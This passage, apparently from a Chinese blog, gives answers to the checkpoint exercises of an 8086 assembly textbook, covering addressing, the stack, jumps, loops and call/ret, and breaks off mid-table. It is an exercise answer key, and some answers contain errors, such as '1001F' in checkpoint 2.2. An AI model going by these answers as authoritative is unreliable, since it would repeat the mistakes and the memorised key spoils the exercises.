class="built_in">AX</span> =</div><div class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">bx</span>		<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">bh</span>		<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="built_in">bl</span>		<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">add</span> <span class="number">ah</span>, <span class="number">ah</span>		<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">add</span> <span class="built_in">al</span>, <span class="number">6</span>		<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">add</span> <span class="built_in">al</span>, <span class="built_in">al</span>		<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cx</span>		<span class="built_in">AX</span> =</div></pre></td></tr></table></figure>
 <strong>F4A3H    31A3H    3123H 6246H    826CH    6246H    826CH    04D8H    0482H    6C82H    D882H    D888H    D810H    6246H</strong></li>
<li>只能使用目前学过的汇编指令，最多使用4条指令，编程计算2的4次方。 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">ax</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="检测点-2-2"><a href="#检测点-2-2" class="headerlink" title="检测点 2.2"></a>检测点 2.2</h3><ol>
<li>给定段地址为0001H，仅通过变化偏移地址寻址，CPU的寻址范围为_____到_____。<br> <strong>00010H到1000FH</strong></li>
<li>有一数据存放在内存20000H的单元中，现给定段地址为SA，若想用偏移地址寻到此单元。则SA应满足的条件是：最小为_____，最大为_____。提示，反过来思考一下，当段地址给定为多少，CPU无论怎么变化偏移地址都无法寻到20000H单元？<br> <strong>1001F    2000H</strong><br> <strong>20000H - 0FFFFH = 10001H</strong><br> <strong>20000H - 00000H = 20000H</strong></li>
</ol>
<h3 id="检测点-2-3"><a href="#检测点-2-3" class="headerlink" title="检测点 2.3"></a>检测点 2.3</h3><p>下面的3条指令执行后，CPU几次修改IP？都是在什么时候？最后IP中的值是多少？<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">bx</span></div><div class="line"><span class="keyword">sub</span> <span class="built_in">ax</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">jmp</span> <span class="built_in">ax</span></div></pre></td></tr></table></figure></p>
<p>修改了四次：</p>
<ol>
<li>第1条指令执行后，IP指向第2条指令</li>
<li>第2条指令执行后，IP指向第3条指令</li>
<li>第3条指令执行后，IP指向第4条指令</li>
<li>JMP指令执行后，IP重新指向第1条指令</li>
</ol>
<h2 id="第三章-寄存器（内存访问）"><a href="#第三章-寄存器（内存访问）" class="headerlink" title="第三章 寄存器（内存访问）"></a>第三章 寄存器（内存访问）</h2><h3 id="检测点-3-1"><a href="#检测点-3-1" class="headerlink" title="检测点 3.1"></a>检测点 3.1</h3><ol>
<li><p>在Debug中，用“d 0:0 1f”查看内存，结果如下。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0000</span>:<span class="number">0000</span> <span class="number">70</span> <span class="number">80</span> F0 <span class="number">30</span> EF <span class="number">60</span> <span class="number">30</span> E2-<span class="number">00</span> <span class="number">80</span> <span class="number">80</span> <span class="number">12</span> <span class="number">66</span> <span class="number">20</span> <span class="number">22</span> <span class="number">60</span></div><div class="line"><span class="number">0000</span>:<span class="number">0010</span> <span class="number">62</span> <span class="number">26</span> E6 D6 CC 2E 3C 3B-AB BA <span class="number">00</span> <span class="number">00</span> <span class="number">26</span> <span class="number">06</span> <span class="number">66</span> <span class="number">88</span></div></pre></td></tr></table></figure>
<p> 下面的程序执行前，AX=0，BX=0，写出每条汇编指令执行完后相关寄存器中的值。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">1</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, [<span class="number">0000</span>]			<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, [<span class="number">0001</span>]			<span class="built_in">BX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">bx</span>			<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, [<span class="number">0000</span>]			<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, [<span class="number">0002</span>]			<span class="built_in">BX</span> =</div><div class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">bx</span>			<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, [<span class="number">0004</span>]			<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span>			<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="number">0002</span>]			<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span>			<span class="built_in">BX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">bl</span>, [000C]			<span class="built_in">BX</span> =</div><div class="line"><span class="keyword">add</span> <span class="built_in">al</span>, <span class="built_in">bl</span>			<span class="built_in">AX</span> =</div></pre></td></tr></table></figure>
<p> 提示，注意ds的设置。</p>
<p> 2662H    E626H    E626H    2662H    D6E6H    FD48H    2C14H    0    00E6H    0    0026H    000CH</p>
</li>
<li>内存中的情况如图3.6所示。<br> 各寄存器的初始值：CS=2000H，IP=0，DS=1000H，AX=0，BX=0；<br> (1)写出CPU执行的指令序列（用汇编指令写出）<br> (2)写出CPU执行每条指令后，CS、IP和相关寄存器中的数值。<br> (3)再次体会：数据和程序有区别吗？如何确定内存中的信息哪些是数据，哪些是程序？</li>
</ol>
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">CS:IP</th>
<th style="text-align:center">DS</th>
<th style="text-align:center">AX</th>
<th style="text-align:center">BX</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">mov ax, 6622H</td>
<td style="text-align:center">2000:3</td>
<td style="text-align:center">1000H</td>
<td style="text-align:center">6622H</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">jmp 0ff0:0100</td>
<td style="text-align:center">2000:8-&gt;1000:0</td>
<td style="text-align:center">1000H</td>
<td style="text-align:center">6622H</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov ax, 2000H</td>
<td style="text-align:center">1000:3</td>
<td style="text-align:center">1000H</td>
<td style="text-align:center">2000H</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov ds, ax</td>
<td style="text-align:center">1000:5</td>
<td style="text-align:center">2000H</td>
<td style="text-align:center">2000H</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov ax, [0008]</td>
<td style="text-align:center">1000:8</td>
<td style="text-align:center">2000H</td>
<td style="text-align:center">C389H</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov ax, [0002]</td>
<td style="text-align:center">1000:B</td>
<td style="text-align:center">2000H</td>
<td style="text-align:center">EA66H</td>
<td style="text-align:center">0</td>
</tr>
</tbody>
</table>
<p>程序和数据没有区别，本质上都是二进制01码，关键在于CPU如何解读。</p>
<h3 id="检测点-3-2"><a href="#检测点-3-2" class="headerlink" title="检测点 3.2"></a>检测点 3.2</h3><ol>
<li><p>补全下面的程序，使其可以将10000H～1000FH中的8个字，逆序复制到20000H～2000FH中。逆序复制的含义如图3.17所示（图中内存里的数据均为假设）。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">1000H</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line">__________</div><div class="line">__________</div><div class="line">__________</div><div class="line"><span class="keyword">push</span> [<span class="number">0</span>]</div><div class="line"><span class="keyword">push</span> [<span class="number">2</span>]</div><div class="line"><span class="keyword">push</span> [<span class="number">4</span>]</div><div class="line"><span class="keyword">push</span> [<span class="number">6</span>]</div><div class="line"><span class="keyword">push</span> [<span class="number">8</span>]</div><div class="line"><span class="keyword">push</span> [A]</div><div class="line"><span class="keyword">push</span> [C]</div><div class="line"><span class="keyword">push</span> [E]</div></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">0010H</span></div></pre></td></tr></table></figure>
</li>
<li><p>补全下面的程序，使其可以将10000H～1000FH中的8个字，逆序复制到20000H～2000FH中。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line">__________</div><div class="line">__________</div><div class="line">__________</div><div class="line"><span class="keyword">pop</span> [E]</div><div class="line"><span class="keyword">pop</span> [C]</div><div class="line"><span class="keyword">pop</span> [A]</div><div class="line"><span class="keyword">pop</span> [<span class="number">8</span>]</div><div class="line"><span class="keyword">pop</span> [<span class="number">6</span>]</div><div class="line"><span class="keyword">pop</span> [<span class="number">4</span>]</div><div class="line"><span class="keyword">pop</span> [<span class="number">2</span>]</div><div class="line"><span class="keyword">pop</span> [<span class="number">0</span>]</div></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">1000H</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">0</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="第六章-包含多个段的程序"><a href="#第六章-包含多个段的程序" class="headerlink" title="第六章 包含多个段的程序"></a>第六章 包含多个段的程序</h2><h3 id="检测点-6-1"><a href="#检测点-6-1" class="headerlink" title="检测点 6.1"></a>检测点 6.1</h3><ol>
<li><p>下面的程序实现依此用内存0:0-0:15单元中的内容改写程序中的数据，完成程序：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</div><div class="line"></div><div class="line">codesg <span class="meta">segment</span></div><div class="line">	<span class="built_in">dw</span> <span class="number">0123h</span>, <span class="number">0456h</span>, <span class="number">0789h</span>, <span class="number">0abch</span>, <span class="number">0defh</span>, <span class="number">0fedh</span>, <span class="number">0cbah</span>, <span class="number">0987h</span></div><div class="line"><span class="symbol"></span></div><div class="line">start:	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></div><div class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, [<span class="built_in">bx</span>]</div><div class="line">	_________</div><div class="line">	<span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></div><div class="line">	<span class="keyword">loop</span> s</div><div class="line"></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line">	<span class="keyword">int</span> <span class="number">21h</span></div><div class="line"></div><div class="line">codesg ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">cs</span>:[<span class="built_in">bx</span>], <span class="built_in">ax</span></div></pre></td></tr></table></figure>
</li>
<li><p>下面的程序实现依此用内存0:0-0:15单元中的内容改写程序中的数据，数据的传送用栈来进行。栈空间设置在程序内。完成程序：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</div><div class="line">	<span class="built_in">dw</span> <span class="number">0123h</span>, <span class="number">0456h</span>, <span class="number">0789h</span>, <span class="number">0abch</span>, <span class="number">0defh</span>, <span class="number">0fedh</span>, <span class="number">0cbah</span>, <span class="number">0987h</span></div><div class="line"></div><div class="line">	<span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></div><div class="line"><span class="symbol"></span></div><div class="line">start:	<span class="keyword">mov</span> <span class="built_in">ax</span>, ____</div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">sp</span>, ____</div><div class="line"></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></div><div class="line"><span class="symbol">s:</span>	<span class="keyword">push</span> [<span class="built_in">bx</span>]</div><div class="line">	____________</div><div class="line">	<span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></div><div class="line">	<span class="keyword">loop</span> s</div><div class="line"></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line">	<span class="keyword">int</span> <span class="number">21h</span></div><div class="line"></div><div class="line">codesg ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cs</span></div><div class="line"><span class="number">24h</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cs</span>:[<span class="built_in">bx</span>]</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="第九章-转移指令的原理"><a href="#第九章-转移指令的原理" class="headerlink" title="第九章 转移指令的原理"></a>第九章 转移指令的原理</h2><h3 id="检测点-9-1"><a href="#检测点-9-1" class="headerlink" title="检测点 9.1"></a>检测点 9.1</h3><ol>
<li><p>程序如下</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line">	___________</div><div class="line">data ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">jmp</span> <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">bx</span>+<span class="number">1</span>]</div><div class="line"></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure>
<p> 若要使程序中的jmp指令执行后，CS:IP指向程序的第一条指令，在data段中应该定义哪些数据？<br> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">dw</span> <span class="number">0</span>, <span class="number">0</span></div></pre></td></tr></table></figure>
</li>
<li><p>程序如下</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line">	<span class="built_in">dd</span> <span class="number">12345678H</span></div><div class="line">data ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol"></span></div><div class="line">start:	<span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line">	<span class="keyword">mov</span> [<span class="built_in">bx</span>], ____</div><div class="line">	<span class="keyword">mov</span> [<span class="built_in">bx</span> + <span class="number">2</span>], ____</div><div class="line">	<span class="keyword">jmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</div><div class="line"></div><div class="line">code ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
<p> 补全程序，使jmp指令执行后，CS:IP指向程序的第一条指令。<br> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">bx</span></div><div class="line"><span class="built_in">cs</span></div></pre></td></tr></table></figure>
<p> 注意：bx指向低位，bx+2指向高位，低位为IP，而高位为CS。</p>
</li>
<li><p>用Debug查看内存，结果如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">2000</span>:<span class="number">1000</span> BE <span class="number">00</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ......</div></pre></td></tr></table></figure>
<p> 则此时，CPU执行指令：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">jmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">1000H</span>]</div></pre></td></tr></table></figure>
<p> 后，(CS)=?，(IP)=?<br> 答案：<br> (CS)=0006，(IP)=00BE</p>
</li>
</ol>
<h3 id="检测点-9-2"><a href="#检测点-9-2" class="headerlink" title="检测点 9.2"></a>检测点 9.2</h3><p>补全编程，利用jcxz指令，实现在内存2000H段中查找第一个值为0的字节，找到后，将它的偏移地址存储在dx中。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="symbol">s:</span>	__________</div><div class="line">	__________</div><div class="line">	__________</div><div class="line">	__________</div><div class="line">	<span class="keyword">jmp</span> short s</div><div class="line"><span class="symbol">ok:</span>	<span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="built_in">bx</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line">	<span class="keyword">int</span> <span class="number">21h</span></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure><br>答案：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, [<span class="built_in">bx</span>]</div><div class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span> <span class="comment">;注意这一步的必要性</span></div><div class="line"><span class="keyword">jcxz</span> ok</div><div class="line"><span class="keyword">inc</span> <span class="built_in">bx</span></div></pre></td></tr></table></figure></p>
<h3 id="检测点-9-3"><a href="#检测点-9-3" class="headerlink" title="检测点 9.3"></a>检测点 9.3</h3><p>补全编程，利用loop指令，实现在内存的2000H段中查找第一个值为0的字节，找到后，将它的偏移地址存储在dx中。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">2000H</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">cl</span>, [<span class="built_in">bx</span>]</div><div class="line">	<span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span></div><div class="line">	_________</div><div class="line">	<span class="keyword">inc</span> <span class="built_in">bx</span></div><div class="line">	<span class="keyword">loop</span> s</div><div class="line"><span class="symbol">ok:</span>	<span class="keyword">dec</span> <span class="built_in">bx</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="built_in">bx</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line">	<span class="keyword">int</span> <span class="number">21h</span></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure><br>答案：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">inc</span> <span class="built_in">cx</span> <span class="comment">;注意loop的工作原理</span></div></pre></td></tr></table></figure></p>
<h2 id="第十章-CALL和RET指令"><a href="#第十章-CALL和RET指令" class="headerlink" title="第十章 CALL和RET指令"></a>第十章 CALL和RET指令</h2><h3 id="检测点-10-1"><a href="#检测点-10-1" class="headerlink" title="检测点 10.1"></a>检测点 10.1</h3><p>补全程序，实现从内存1000：0000处开始执行指令。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">stack <span class="meta">segment</span></div><div class="line">	<span class="built_in">db</span> <span class="number">16</span> dup (<span class="number">0</span>)</div><div class="line">stack ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>,stack</div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">16</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, ____</div><div class="line">	<span class="keyword">push</span> <span class="built_in">ax</span></div><div class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, ____</div><div class="line">	<span class="keyword">push</span> <span class="built_in">ax</span></div><div class="line">	<span class="keyword">retf</span></div><div class="line">code ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure><br>答案：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">1000h</span></div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure></p>
<h3 id="检测点-10-2"><a href="#检测点-10-2" class="headerlink" title="检测点 10.2"></a>检测点 10.2</h3><p>下面的程序执行后，ax中的数值为多少？</p>
<table>
<thead>
<tr>
<th style="text-align:center">内存地址</th>
<th style="text-align:center">机器码</th>
<th style="text-align:center">汇编指令</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1000:0</td>
<td style="text-align:center">b8 00 00</td>
<td style="text-align:center">mov ax,0</td>
</tr>
<tr>
<td style="text-align:center">1000:3</td>
<td style="text-align:center">e8 01 00</td>
<td style="text-align:center">call s</td>
</tr>
<tr>
<td style="text-align:center">1000:6</td>
<td style="text-align:center">40</td>
<td style="text-align:center">inc ax</td>
</tr>
<tr>
<td style="text-align:center">1000:7</td>
<td style="text-align:center">58</td>
<td style="text-align:center">s:    pop ax</td>
</tr>
</tbody>
</table>
<p>ax中的数值为6，注意执行完call s后，IP先变为6，然后将IP的值压栈，最后跳转至s。</p>
<h3 id="检测点-10-3"><a href="#检测点-10-3" class="headerlink" title="检测点 10.3"></a>检测点 10.3</h3><p>下面的程序执行后，ax中的数值为多少？</p>
<table>
<thead>
<tr>
<th style="text-align:center">内存地址</th>
<th style="text-align:center">机器码</th>
<th style="text-align:center">汇编指令</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1000:0</td>
<td style="text-align:center">b8 00 00</td>
<td style="text-align:center">mov ax,0</td>
</tr>
<tr>
<td style="text-align:center">1000:3</td>
<td style="text-align:center">9a 09 00 00 10</td>
<td style="text-align:center">call far ptr s</td>
</tr>
<tr>
<td style="text-align:center">1000:8</td>
<td style="text-align:center">40</td>
<td style="text-align:center">inc ax</td>
</tr>
<tr>
<td style="text-align:center">1000:9</td>
<td style="text-align:center">58</td>
<td style="text-align:center">s:    pop ax</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
